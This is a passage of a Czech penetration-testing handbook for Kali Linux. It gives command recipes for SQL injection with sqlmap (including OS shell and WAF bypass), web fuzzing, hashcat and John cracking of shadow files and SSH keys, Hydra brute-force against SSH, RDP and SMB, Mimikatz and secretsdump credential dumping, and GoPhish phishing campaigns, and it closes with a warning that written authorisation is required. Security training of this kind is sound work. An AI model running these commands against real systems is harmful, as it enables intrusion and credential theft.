sqlmap -u "http://target.com/page.php?id=1" -D targetdb -T users --dump

# Testování POST parametrů
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Testování cookies
sqlmap -u "http://target.com/page" --cookie="session=abc123; id=1" -p id

# Použití zachyceného requestu z Burp Suite
sqlmap -r request.txt

# OS shell přes SQL injection
sqlmap -u "http://target.com/?id=1" --os-shell

# Přeskočení WAF
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase

# Agresivní testování (level 5, risk 3)
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3
```

---

### 8.3 Web Fuzzing

#### 🔍 `gobuster`

**Co je:** Nástroj pro brute-force hledání adresářů, souborů a subdomén na webových serverech.  
**Jak funguje:** Paralelně posílá HTTP requesty s každou položkou ze wordlistu a sleduje odpovědi se stavovými kódy indikujícími existenci zdroje.  
**Jak se používá:**

```bash
# Sken adresářů
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# S konkrétními příponami
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak

# Brute-force subdomén
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt

# VHOST discovery
gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt

# Ignorovat konkrétní status kódy
gobuster dir -u http://target.com -w wordlist.txt --exclude-length 0 -b 404,403

# S autentizací
gobuster dir -u http://target.com -w wordlist.txt -U admin -P password

# Přes Burp proxy
gobuster dir -u http://target.com -w wordlist.txt --proxy http://127.0.0.1:8080
```

---

#### 🔍 `ffuf`

**Co je:** Rychlý web fuzzer napsaný v Go, vhodný pro testování API i webových aplikací.  
**Jak funguje:** Nahrazuje klíčové slovo `FUZZ` v URL, hlavičkách nebo těle requestu položkami ze wordlistu.  
**Jak se používá:**

```bash
# Fuzzing adresářů
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ

# Fuzzing subdomén
ffuf -w /usr/share/wordlists/subdomains.txt \
  -u http://FUZZ.target.com \
  -H "Host: FUZZ.target.com"

# Fuzzing POST parametrů
ffuf -w params.txt -u http://target.com/login \
  -X POST \
  -d "username=FUZZ&password=admin"

# Filtrování odpovědí dle velikosti
ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 0

# Filtrování dle status kódu
ffuf -w wordlist.txt -u http://target.com/FUZZ -fc 404,403

# Fuzzing API endpointů
ffuf -w api_words.txt -u http://target.com/api/v1/FUZZ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN"

# Ukládání výsledků
ffuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json
```

---

### 8.4 XSS a další zranitelnosti

#### 🔍 `xsser`

```bash
# Automatické testování XSS
xsser --url "http://target.com/page.php?param=XSS"

# POST data
xsser --url "http://target.com/submit" --data "comment=XSS"

# Použití vlastního payload souboru
xsser --url "http://target.com/?q=XSS" --Fp payloads.txt
```

---

## 9. Password Attacks

### 9.1 Offline Password Cracking

#### 🔍 `hashcat`

**Co je:** Nejrychlejší nástroj pro cracking hesel pomocí GPU akcelerace.  
**Jak funguje:** Využívá GPU pro paralelní výpočet hashů — může generovat a testovat miliardy kombinací za sekundu. Podporuje 300+ typů hashů.

```bash
# Identifikace typu hashe
hashcat --example-hashes | grep -i "HASH_TYPE"

# ═══════════════════════════════════════
# TYPY ÚTOKU (-a)
# 0 = Wordlist
# 1 = Combination
# 3 = Brute-force (mask)
# 6 = Wordlist + Mask
# ═══════════════════════════════════════

# Wordlist útok — MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Wordlist útok — NTLM (Windows)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Wordlist + pravidla (nejefektivnější)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Brute-force s maskou
# ?l=lowercase, ?u=uppercase, ?d=digit, ?s=special, ?a=all
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d

# SHA-256
hashcat -m 1400 hashes.txt wordlist.txt

# bcrypt
hashcat -m 3200 hashes.txt wordlist.txt

# WPA2 handshake
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Zobrazení prolomených hesel
hashcat -m 1000 hashes.txt --show

# Pokračování přerušeného útoku
hashcat -m 1000 hashes.txt wordlist.txt --restore
```

---

#### 🔍 `john` (John the Ripper)

**Co je:** Klasický CPU-based password cracker s automatickou detekcí hash formátů.  
**Jak funguje:** Detekuje typ hashe a aplikuje wordlist, pravidla nebo brute-force útok.  
**Jak se používá:**

```bash
# Automatický crack (auto-detekce formátu)
john hashes.txt

# S wordlistem
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# S pravidly
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Cracking /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

# Zobrazení prolomených hesel
john --show hashes.txt

# Cracking zip hesla
zip2john protected.zip > zip_hash.txt
john zip_hash.txt

# Cracking SSH klíče
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=rockyou.txt
```

---

### 9.2 Online Password Attacks

#### 🔍 `hydra`

**Co je:** Paralelní síťový login cracker podporující desítky protokolů.  
**Jak funguje:** Posílá autentizační požadavky na cílovou službu s kombinacemi uživatelských jmen a hesel ze wordlistu.  
**Jak se používá:**

```bash
# SSH brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# SSH s více uživateli
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP brute-force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.100 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# RDP brute-force
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# SMB brute-force
hydra -l admin -P passwords.txt smb://192.168.1.100

# MySQL brute-force
hydra -l root -P passwords.txt mysql://192.168.1.100

# Throttling (zabránění lockoutu)
hydra -l admin -P passwords.txt ssh://192.168.1.100 -t 4 -W 3
```

---

#### 🔍 `medusa`

**Co je:** Modulární, rychlý a paralelní brute-force nástroj pro vzdálené autentizační služby.  
**Jak funguje:** Podobně jako Hydra, ale s odlišnou implementací paralelismu.

```bash
# SSH brute-force
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# HTTP brute-force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin

# FTP brute-force
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp
```

---

### 9.3 Hash Extrakce

```bash
# Extrakce NTLM hashů z Windows (Meterpreter)
meterpreter > hashdump

# Mimikatz — dump přihlašovacích údajů z paměti
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Impacket secretsdump
impacket-secretsdump -hashes ':NTLM_HASH' domain/admin@192.168.1.100
```

---

## 10. Social Engineering

### 10.1 SET (Social Engineer Toolkit)

**Co je:** Framework pro sociální inženýrství integrovaný v Kali Linuxu.  
**Jak funguje:** Automatizuje vytváření phishingových stránek, malicózních souborů a e-mailových kampaní.  
**Jak se používá:**

```bash
# Spuštění SET
setoolkit

# Menu v SET:
# 1) Social-Engineering Attacks
#    1) Spear-Phishing Attack Vectors
#    2) Website Attack Vectors
#       1) Java Applet Attack Method
#       2) Metasploit Browser Exploit Method
#       3) Credential Harvester Attack Method (klon přihlašovací stránky)
#    3) Infectious Media Generator (payload na USB)
#    4) Create a Payload and Listener
#    5) Mass Mailer Attack
```

---

### 10.2 Phishing s `gophish`

**Co je:** Open-source phishing framework pro simulaci phishingových kampaní.  
**Jak funguje:** Webové rozhraní pro správu phishingových kampaní, sledování otevření e-mailů, kliknutí na odkazy a zadaných přihlašovacích údajů.

```bash
# Spuštění GoPhish
./gophish

# Přístup k admin panelu:
# https://127.0.0.1:3333
# Výchozí: admin / gophish

# Workflow:
# 1. Sending Profiles (SMTP server)
# 2. Email Templates (phishingový e-mail)
# 3. Landing Pages (falešná přihlašovací stránka)
# 4. Users & Groups (cíle)
# 5. Campaigns → Launch
```

---

## 11. Reporting

Dobrý penetrační test je bez kvalitního reportu bezcenný. Report musí být srozumitelný jak pro technický, tak pro management tým.

### 11.1 Struktura pentest reportu

```
1. EXECUTIVE SUMMARY (pro management)
   ├── Celkové hodnocení rizika
   ├── Klíčové nálezy (bez technických detailů)
   └── Hlavní doporučení

2. TECHNICKÝ REPORT (pro bezpečnostní tým)
   ├── Metodologie a scope
   ├── Přehled nástrojů
   ├── Detailní nálezy (seřazené dle závažnosti)
   │   ├── Kritická zranitelnost
   │   ├── Vysoká zranitelnost
   │   ├── Střední zranitelnost
   │   └── Nízká/Informační
   └── Doporučení k nápravě

3. PŘÍLOHY
   ├── Surová data (nmap výstupy, logy)
   ├── Screenshots jako důkaz
   └── CVE reference
```

### 11.2 CVSS skóre — hodnocení závažnosti

|Skóre|Závažnost|Barva|
|---|---|---|
|9.0–10.0|Kritická|🔴|
|7.0–8.9|Vysoká|🟠|
|4.0–6.9|Střední|🟡|
|0.1–3.9|Nízká|🟢|
|0.0|Informační|⚪|

### 11.3 `dradis` — Collaboration & Reporting

**Co je:** Webová platforma pro spolupráci a generování pentest reportů.  
**Jak funguje:** Importuje výstupy z nmap, Nessus, Burp Suite a dalších nástrojů a umožňuje týmovou spolupráci na reportu.

```bash
# Spuštění Dradis serveru
dradis start

# Přístup na: http://localhost:3000
# Import nmap výstupu, přidání nálezů, generování reportu
```

### 11.4 Šablona nálezu

```markdown
## [KRITICKÁ] MS17-010 EternalBlue — RCE na SMB

**CVE:** CVE-2017-0144  
**CVSS:** 9.8 (Kritická)  
**Postižený systém:** 192.168.1.100 (WIN-SRV-01)  
**Postižená služba:** SMB (port 445)

### Popis
Server je zranitelný vůči kritické zranitelnosti MS17-010 (EternalBlue), 
která umožňuje vzdálené spuštění kódu bez autentizace.

### Dopad
Útočník může získat plný přístup (SYSTEM) k postižené stanici, 
kompromitovat citlivá data a použít stanici jako odrazový můstek.

### Důkaz
```

msf6 > use exploit/windows/smb/ms17_010_eternalblue msf6 > set RHOSTS 192.168.1.100 msf6 > run [*] Meterpreter session 1 opened meterpreter > getuid Server username: NT AUTHORITY\SYSTEM

```
Screenshot: [exploit_proof.png]

### Doporučení
1. Okamžitě aplikovat bezpečnostní záplatu KB4012212
2. Zablokovat SMBv1 (Set-SmbServerConfiguration -EnableSMB1Protocol $false)
3. Blokovat port 445 na perimetru firewallů
4. Izolovat nepatchované systémy do separátního VLAN

### Reference
- https://www.microsoft.com/en-us/security/blog/2017/05/12/customer-guidance-for-wannacrypt-attacks/
- https://nvd.nist.gov/vuln/detail/CVE-2017-0144
```

---

## Appendix: Rychlý přehled nástrojů

|Nástroj|Kategorie|Popis|
|---|---|---|
|`nmap`|Scanning|Síťový skener, detekce portů a služeb|
|`masscan`|Scanning|Ultra-rychlý port scanner|
|`metasploit`|Exploitation|Exploit framework|
|`msfvenom`|Payload|Generátor payloadů|
|`sqlmap`|Web|SQL injection automatizace|
|`burpsuite`|Web|Web proxy & application tester|
|`gobuster`|Web|Brute-force adresářů/subdomén|
|`ffuf`|Web|Rychlý web fuzzer|
|`hashcat`|Passwords|GPU password cracker|
|`john`|Passwords|CPU password cracker|
|`hydra`|Passwords|Síťový brute-force|
|`aircrack-ng`|Wireless|WiFi audit suite|
|`theHarvester`|OSINT|Sběr e-mailů a subdomén|
|`recon-ng`|OSINT|Modulární OSINT framework|
|`crackmapexec`|AD|Active Directory exploitation|
|`impacket`|AD|Windows protocol tools|
|`linpeas/winpeas`|PrivEsc|Automatické hledání escalation vektorů|
|`enum4linux`|Enumeration|SMB/Samba enumerace|
|`nikto`|Web|Web server vulnerability scanner|
|`setoolkit`|Social Eng.|Social engineering toolkit|

---

## Appendix: Klíčové wordlisty v Kali

```bash
# Rockyou — nejčastěji používaný pro cracking hesel
/usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# Dirb wordlisty pro web
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt

# Dirbuster wordlisty
/usr/share/wordlists/dirbuster/

# SecLists — rozšířená kolekce
sudo apt install seclists
ls /usr/share/seclists/
```

---

## Appendix: Síťové příkazy pro analýzu

```bash
# Zobrazení vlastní IP adresy
ip a
ifconfig

# Zobrazení routovací tabulky
ip route
route -n

# ARP tabulka
arp -a

# Aktivní TCP spojení
ss -tuln
netstat -tuln

# Sledování síťového provozu
tcpdump -i eth0
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 'port 80'

# Wireshark (GUI)
wireshark

# Analýza provozu
tshark -r capture.pcap
```

---

> **📚 Další vzdělávání:** TryHackMe, HackTheBox, OSCP certifikace (Offensive Security), eJPT (eLearnSecurity), CEH (Certified Ethical Hacker)

> **⚖️ Právní rámec ČR:** Neoprávněný přístup k počítačovému systému je trestný čin dle § 230 Trestního zákoníku. Vždy si zajistěte písemné povolení (tzv. „Rules of Engagement" / „Scope of Work") před zahájením jakéhokoliv testování.